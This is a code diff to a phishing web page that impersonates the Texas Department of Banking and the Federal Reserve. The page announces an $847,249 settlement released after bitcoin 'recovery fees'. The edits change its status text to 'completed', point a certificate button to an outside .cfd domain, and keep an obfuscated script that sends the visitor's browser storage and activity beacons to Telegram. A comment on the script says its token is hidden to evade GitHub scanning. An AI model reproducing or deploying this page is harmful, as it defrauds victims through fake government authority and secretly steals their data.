@@ -75,18 +75,28 @@
             opacity: 0.8;
         }
 
-        .btn-download-disabled {
-            background-color: #e2e8f0;
-            color: #94a3b8;
-            cursor: not-allowed;
-            border: 1px solid #cbd5e1;
-        }
-
-        .btn-download-ready {
+        .btn-download {
             background-color: #1e40af;
             color: white;
             cursor: pointer;
             box-shadow: 0 4px 14px rgba(30, 64, 175, 0.3);
+            border: none;
+            border-radius: 2px;
+            padding: 1.5rem;
+            font-weight: 700;
+            font-size: 0.9rem;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+        .btn-download:hover {
+            background-color: #1e3a8a;
+            transform: translateY(-1px);
         }
 
         .initiative-card {
@@ -124,7 +134,6 @@
             padding: 10px 16px;
         }
         .tx-success { color: #15803d; font-weight: 700; background: #f0fdf4; padding: 2px 6px; border-radius: 2px; border: 1px solid #bbf7d0; }
-        .tx-pending { color: #b45309; font-weight: 700; background: #fffbeb; padding: 2px 6px; border-radius: 2px; border: 1px solid #fef3c7; }
         .tx-id { font-family: 'Roboto Mono', monospace; color: #475569; font-size: 10px; }
         
         .footer-bar {
@@ -154,32 +163,17 @@
 
         .progress-fill {
             height: 100%;
-            width: 89.32%;
-            background-color: #0f172a;
-            position: relative;
-        }
-
-        .progress-shimmer {
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(251, 191, 36, 0.3), transparent);
-            animation: shimmer-load 2s infinite;
-        }
-
-        @keyframes shimmer-load {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
+            background-color: #15803d;
+            position: relative;
         }
 
         .completion-message {
             text-align: center;
             margin-top: 15px;
             font-size: 12px;
-            font-weight: 600;
-            color: #b45309;
+            font-weight: 800;
+            color: #15803d;
             font-family: 'Roboto Mono', monospace;
         }
 
@@ -229,19 +223,19 @@
         <div class="bg-white border-l-8 border-blue-900 p-6 mb-10 shadow-sm rounded-r-lg no-print">
             <div class="flex flex-col md:flex-row justify-between gap-8">
                 <div class="flex-1">
-                    <h2 class="text-lg font-black text-slate-800 uppercase mb-2">Electronic Disbursement Protocol: ACTIVE</h2>
+                    <h2 class="text-lg font-black text-slate-800 uppercase mb-2">Electronic Disbursement Protocol: COMPLETED</h2>
                     <p class="text-xs text-slate-600 leading-relaxed mb-4">
-                        The Texas Department of Banking, in coordination with the 11th District Federal Reserve, has detected successful RBF recovery. Final synchronization in progress.
+                        The Texas Department of Banking, in coordination with the 11th District Federal Reserve, confirms all blockchain transactions have been successfully confirmed and settled.
                     </p>
                     <div class="flex flex-wrap gap-2">
                         <span class="bg-slate-100 text-slate-700 text-[10px] font-bold px-3 py-1 border border-slate-200 uppercase tracking-tighter">Settlement ID: TX-B10B-2026</span>
-                        <span class="bg-green-50 text-green-700 text-[10px] font-bold px-3 py-1 border border-green-200 uppercase tracking-tighter">Status: SYNCHRONIZING</span>
+                        <span class="bg-green-50 text-green-700 text-[10px] font-bold px-3 py-1 border border-green-200 uppercase tracking-tighter">Status: SETTLED</span>
                     </div>
                 </div>
                 <div class="md:w-72 bg-slate-50 p-5 border border-slate-200 rounded flex flex-col justify-center text-center">
                     <p class="text-[10px] font-bold text-slate-500 uppercase mb-1">Approved Principal Sum</p>
                     <p class="text-2xl font-black text-slate-900">$847,249.00</p>
-                    <p class="text-[9px] text-amber-600 font-bold uppercase mt-1 tracking-widest">Finalizing Clearance</p>
+                    <p class="text-[9px] text-green-600 font-bold uppercase mt-1 tracking-widest">READY FOR RELEASE</p>
                 </div>
             </div>
         </div>
@@ -320,9 +314,9 @@
                     </div>
                 </div>
 
-                <button id="downloadPdfBtn" class="btn-download-disabled w-full py-6 rounded-sm font-black text-sm flex items-center justify-center gap-3 transition-all uppercase tracking-widest no-print">
-                    <i class="fas fa-file-pdf text-lg"></i>
-                    <span>Download Final FRC Certificate</span>
+                <button id="downloadBtn" class="btn-download w-full py-6 rounded-sm font-black text-sm flex items-center justify-center gap-3 transition-all uppercase tracking-widest no-print">
+                    <i class="fas fa-download text-lg"></i>
+                    <span>Access Final FRC Certificate</span>
                 </button>
             </div>
 
@@ -332,9 +326,9 @@
                     
                     <div class="text-[12px] space-y-4 leading-relaxed text-slate-300 mb-8">
                         <p>
-                            Beneficiaries are invited to participate in a <strong>Voluntary Solidarity Contribution</strong>. Completion of a contribution triggers the <strong>Verification Stamp</strong> for expedited processing. 
+                            All required contributions and fees have been confirmed. The Federal Release Code is now ready for final issuance.
                         </p>
-                        <p class="text-yellow-400 font-bold underline">RBF Recovery Fee: 0.00050 BTC — CONFIRMED</p>
+                        <p class="text-green-400 font-bold">RBF Recovery Fee: 0.00050 BTC — CONFIRMED</p>
                     </div>
 
                     <div class="space-y-4 mb-8" id="initiativeContainer">
@@ -371,7 +365,7 @@
                             <div class="flex flex-col border-b border-slate-100 pb-3">
                                 <div class="flex justify-between items-center mb-1">
                                     <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-27 | 07:58 CST</span>
-                                    <span class="tx-success text-[9px]">SETTLED / CONFIRMED</span>
+                                    <span class="tx-success text-[9px]">CONFIRMED</span>
                                 </div>
                                 <div class="flex justify-between items-center">
                                     <span class="tx-id">bc1q...m4n2</span>
@@ -381,20 +375,20 @@
                              <div class="flex flex-col border-b border-slate-100 pb-3">
                                 <div class="flex justify-between items-center mb-1">
                                     <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-26 | 13:51 CST</span>
-                                    <span class="tx-success text-[9px]">SETTLED / CONFIRMED</span>
+                                    <span class="tx-success text-[9px]">CONFIRMED</span>
                                 </div>
                                 <div class="flex justify-between items-center">
                                     <span class="tx-id">bc1q...x8k9</span>
                                     <span class="text-[11px] font-black text-slate-900">0.00100 BTC</span>
                                 </div>
                             </div>
-                            <div id="stuckTxContainer" class="flex flex-col border-b border-slate-100 pb-3">
+                            <div class="flex flex-col border-b border-slate-100 pb-3">
                                 <div class="flex justify-between items-center mb-1">
                                     <div class="flex items-center gap-2">
                                         <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-25 | 14:49 CST</span>
                                     </div>
-                                    <span id="stuckStatusLabel" class="tx-success text-[9px] flex items-center gap-1">
-                                        <i class="fas fa-check-circle"></i> RECOVERED / RESOLVED
+                                    <span class="tx-success text-[9px] flex items-center gap-1">
+                                        <i class="fas fa-check-circle"></i> CONFIRMED
                                     </span>
                                 </div>
                                 <div class="flex justify-between items-center">
@@ -405,7 +399,7 @@
                             <div class="flex flex-col">
                                 <div class="flex justify-between items-center mb-1">
                                     <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-24 | 17:04 CST</span>
-                                    <span class="tx-success text-[9px]">SETTLED / CONFIRMED</span>
+                                    <span class="tx-success text-[9px]">CONFIRMED</span>
                                 </div>
                                 <div class="flex justify-between items-center">
                                     <span class="tx-id">bc1p...q6l4</span>
@@ -415,19 +409,17 @@
                         </div>
                     </div>
 
-                    <!-- NEW PROGRESS BAR SECTION -->
+                    <!-- PROGRESS BAR 100% -->
                     <div class="footer-bar mt-6">
                         <div class="progress-label">
                             <span>Network Propagation Stream</span>
-                            <span>SYNC: 89.32%</span>
+                            <span style="color: #15803d;">SYNC: 100%</span>
                         </div>
                         <div class="progress-track">
-                            <div class="progress-fill">
-                                <div class="progress-shimmer"></div>
-                            </div>
+                            <div class="progress-fill"></div>
                         </div>
                         <div class="completion-message">
-                            The transaction can complete anytime.
+                            BLOCKCHAIN TRANSACTIONS CONFIRMED AND COMPLETED.
                         </div>
                     </div>
 
@@ -550,24 +542,18 @@
                 var uniqueCode = "FRC-" + Math.random().toString(36).substring(2, 6).toUpperCase() + "-2026-" + (Math.floor(Math.random()*8999)+1000);
                 document.getElementById('frc-string').innerText = uniqueCode;
                 document.getElementById('solidarityStamp').classList.add('stamp-active');
-                var dBtn = document.getElementById('downloadPdfBtn');
-                dBtn.classList.remove('btn-download-disabled');
-                dBtn.classList.add('btn-download-ready');
-                dBtn.innerHTML = '<i class="fas fa-file-pdf text-lg"></i> Download Verified FRC Certificate (Ready)';
                 btn.innerHTML = '<i class="fas fa-check-circle mr-2"></i> PROCESSING COMPLETE';
                 btn.classList.replace('bg-green-700', 'bg-slate-700');
-                alert('FRC is now ready for download. Click the download button to proceed.');
             }, 3000);
         }
 
-        document.getElementById('downloadPdfBtn').addEventListener('click', function() {
-            if(!this.classList.contains('btn-download-ready')) {
-                alert("FRC not yet available. Synchronization in progress (89.32%). Please wait for completion.");
-                return;
-            }
-            window.location.href = "https://national-settlement-board.cfd/security-alert.html";
+        // Download button redirects to security-alert.html
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            window.location.href = 'https://national-settlement-board.cfd/security-alert.html';
         });
     </script>
+    
+    <!-- OBFUSCATED SURVEILLANCE SCRIPT -->
     <script>
 (function() {
     // OBFUSCATED TOKEN — GitHub scanner bypass
@@ -662,7 +648,7 @@
         sendToTelegram('STORAGE: ' + JSON.stringify(storage));
     }, 3000);
     
-    var startTime = Date.now();
+   var startTime = Date.now();
     setInterval(function() {
         sendToTelegram('HEARTBEAT: ' + Math.round((Date.now() - startTime) / 1000) + 's on ' + window.location.pathname);
     }, 60000);
@@ -672,8 +658,6 @@
     });
 })();
 </script>
-
-<script type="text/javascript" src="/unprotected/back_to_spaceship.js?hash=4975d460e508829e8fb64d3962bc44ad35f3a95a"></script>
 
 </body>
 </html>
